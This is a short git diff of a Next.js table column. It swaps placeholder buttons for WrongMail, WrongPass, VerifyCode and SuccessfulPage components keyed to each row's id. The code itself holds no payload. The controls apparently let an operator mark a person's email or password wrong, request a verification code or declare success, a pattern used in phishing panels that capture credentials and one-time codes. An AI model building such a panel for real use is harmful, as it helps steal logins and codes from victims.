@@ -1,6 +1,9 @@
 import Link from "next/link";
 import { getTimeDistance } from "../../../utils/getTimeDistance";
 import WrongPass from "../../WrongPass";
+import WrongMail from "../../WrongMail";
+import VerifyCode from "../../VerifyCode";
+import SuccessfulPage from "../../Successful";
 
 const handleWrongPass = async () => {
   const values = {
@@ -185,16 +188,10 @@ export const collectionColumn = [
     width: 200,
     Cell: ({ row }) => (
       <div className="flex flex-col justify-center items-center gap-2">
-        <button className="bg-red-600 text-xs text-white font-semibold px-2 py-1 rounded">
-          EmailWrong
-        </button>
+        <WrongMail id={row.original._id} />
         <WrongPass id={row.original._id} />
-        <button className="bg-cyan-600 text-xs text-white font-semibold px-2 py-1 rounded">
-          CodeVerify
-        </button>
-        <button className="bg-cyan-600 text-xs text-white font-semibold px-2 py-1 rounded">
-          Successful
-        </button>
+        <VerifyCode id={row.original._id} />
+        <SuccessfulPage id={row.original._id} />
       </div>
     ),
   },
